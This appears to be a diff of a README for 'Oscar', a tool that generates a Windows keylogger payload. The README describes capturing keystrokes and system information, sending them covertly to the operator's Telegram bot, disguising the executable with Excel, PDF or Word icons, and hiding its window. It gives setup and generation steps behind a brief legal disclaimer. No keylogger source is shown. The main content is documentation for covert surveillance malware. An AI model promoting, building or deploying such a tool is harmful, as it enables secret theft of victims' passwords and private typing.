@@ -1,107 +1,142 @@
----
-## Oscar Keylogger
- 
-A powerful tool to generate a customizable keylogger payload for Windows. It captures keystrokes and sends them discreetly to your Telegram bot.
+"""
+# Oscar Keylogger
 
-***This tool is for educational purposes or authorized security testing only. Unauthorized keylogging is illegal and unethical.***
+> **Project status:** Inactive for about 1-2 years – will be revived and updated soon.
 
----
-## Features 🔥
-* **Python interface for configuration, C++ for efficient keylogging**: Uses Python for easy setup and C++ for optimal keylogging performance.
-* **Sends logs to your Telegram bot**: All keystrokes and system information are sent directly to your Telegram bot.
-* **Custom icons**: You can change the executable's icon to mimic popular files like Excel, PDF, Word, etc., to make the tool less conspicuous.
-* **Stealth mode**: The keylogger operates completely hidden by concealing the console window.
-* **Logs system info**: Captures and sends information such as username and operating system version.
+A tool to generate a customizable keylogger payload for Windows. It captures keystrokes and sends them discreetly to your Telegram bot.
+
+**For educational purposes or authorized security testing only. Unauthorized keylogging is illegal and unethical.**
 
 ---
-## Prerequisites 🛠️
-* **Windows OS**: This tool currently supports Windows operating systems only.
-* **Python 3.8 or higher**: Required to run the Python scripts.
-* **Git**: For cloning the repository.
-* **MinGW (g++)**: For compiling the C++ code.
-* **libcurl**: For communicating with the Telegram API.
-* **Python dependencies**: Listed in `requirements.txt`.
+
+## Why the name "Oscar"
+
+When I started this project, the Moon Knight series had just come out, featuring Oscar Isaac as Marc Spector. The name stuck. No hidden meaning - just a good show from that time.
+
+And if you want to know the vibe when this code was written:
+
+https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif
+
+(Search "Moon Knight gif" if the link doesn't work.)
 
 ---
-## Installation ⚙️
-1.  **Clone the repository**:
-    ```bash
-    git clone https://github.com/Arash-abraham/Oscar.git
-    cd Oscar
-    ```
-2.  **Install Python dependencies**:
-    ```bash
-    pip install -r requirements.txt
-    ```
-3.  **Install MinGW and libcurl**:
-    * **Download MinGW**: Get it from [https://www.mingw-w64.org/downloads/](https://www.mingw-w64.org/downloads/).
-    * **Install vcpkg**:
-        ```bash
-        git clone [https://github.com/microsoft/vcpkg.git](https://github.com/microsoft/vcpkg.git)
-        ```
-    * **Install libcurl**:
-        ```bash
-        ./vcpkg install curl
-        ```
-    * **Add MinGW and libcurl to your system PATH**: This step is crucial to ensure your system can access the `g++` compiler and `libcurl` library.
 
-**Note**: Linux support is under development. Currently, only Windows is supported.
+## Features
+
+- Python interface for configuration, C++ for keylogging – easy setup, efficient logging
+- Sends logs to your Telegram bot – keystrokes + system info
+- Custom icons – mimic Excel, PDF, Word, etc.
+- Stealth mode – console window is hidden
 
 ---
-## Usage 🚀
-1.  **Create a Telegram bot**:
-    * Use `@BotFather` on Telegram to create a new bot and obtain your **Bot Token**.
-    * Use `@userinfobot` to get your **Chat ID**.
 
-2.  **Run the tool**:
-    ```bash
-    python3 Oscar.py
-    ```
-    * **Enter the payload name** (e.g., `Oscar`).
-    * **Input your Bot Token and Chat ID**.
-    * **Select an icon** (Excel, PDF, etc.).
-    * The executable will be generated in `dist/<payload_name>.exe`.
+## Prerequisites
 
-3.  **Run the generated payload**:
-    ```bash
-    ./dist/<payload_name>.exe
-    ```
+- Windows OS only (for now)
+- Python 3.8 or higher
+- Git
+- MinGW (g++)
+- libcurl
+- Python dependencies (see requirements.txt)
 
 ---
-## Project Structure 📁
-    Oscar/
-    ├── CPP-Payload/
-    │   └── keylog.cpp          # C++ code for keylogging
-    ├── icon/
-    │   ├── excel.ico           # Custom icons
-    │   ├── pdf.ico
-    │   ├── word.ico
-    │   └── ...
-    ├── modules/
-    │   ├── banner.py           # Module for banner display
-    │   └── gnt.py              # Internal modules
-    ├── Oscar.py                # Main Python script
-    ├── README.md               # Project README file
-    └── requirements.txt        # Python dependencies
-    
----
-## Security and Ethics ⚠️
-* **Use only with explicit permission**: This tool should only be used within legal frameworks and with full authorization.
-* **Never expose your Telegram Bot Token**: Your bot token is confidential and should not be shared.
-* **Comply with local laws and regulations**: You are responsible for using this tool in accordance with local laws.
+
+## Installation
+
+1. Clone the repository:
+"""
+git clone https://github.com/Arash-abraham/Oscar.git
+cd Oscar
+"""
+
+2. Install Python dependencies:
+"""
+pip install -r requirements.txt
+"""
+
+3. Install MinGW and libcurl:
+   - Download MinGW from mingw-w64.org
+   - Install vcpkg:
+"""
+git clone https://github.com/microsoft/vcpkg.git
+"""
+   - Install libcurl:
+"""
+./vcpkg install curl
+"""
+   - Add MinGW and libcurl to your system PATH
+
+**Note:** Linux support is under development.
 
 ---
-## Troubleshooting 🔧
-* **Compilation errors**:
-    * Ensure `g++` and `libcurl` are correctly installed and in your system's PATH.
-    * Check: `g++ --version`
-    * Check: `pkg-config --modversion libcurl`
-* **Icon not applied**:
-    * Verify that the icon files exist in the `icon/` directory.
-* **Telegram not sending logs**:
-    * Double-check your Bot Token and Chat ID for accuracy.
+
+## Usage
+
+1. Create a Telegram bot:
+   - Use @BotFather on Telegram to get your Bot Token
+   - Use @userinfobot to get your Chat ID
+
+2. Run the tool:
+"""
+python Oscar.py
+"""
+   - Enter payload name (e.g., Oscar)
+   - Input Bot Token and Chat ID
+   - Select an icon (Excel, PDF, etc.)
+   - Executable will be generated in `dist/<payload_name>.exe`
+
+3. Run the generated payload:
+"""
+./dist/<payload_name>.exe
+"""
 
 ---
-## Contact 📧
+
+## Project Structure
+
+Oscar/
+├── CPP-Payload/
+│   └── keylog.cpp
+├── icon/
+│   ├── excel.ico
+│   ├── pdf.ico
+│   ├── word.ico
+│   └── ...
+├── modules/
+│   ├── banner.py
+│   └── gnt.py
+├── Oscar.py
+├── README.md
+└── requirements.txt
+
+---
+
+## Security and Ethics
+
+- Use only with explicit permission
+- Never expose your Telegram Bot Token
+- Comply with local laws
+
+---
+
+## Troubleshooting
+
+- Compilation errors: Make sure g++ and libcurl are installed and in PATH.
+  Check with:
+"""
+g++ --version
+pkg-config --modversion libcurl
+"""
+- Icon not applied: Verify icon files exist in `icon/` directory
+- Telegram not sending logs: Double-check Bot Token and Chat ID
+
+---
+
+## Contact
+
 arashebi777@gmail.com
-Hack away!
+
+---
+
+*Hack away.*
+"""
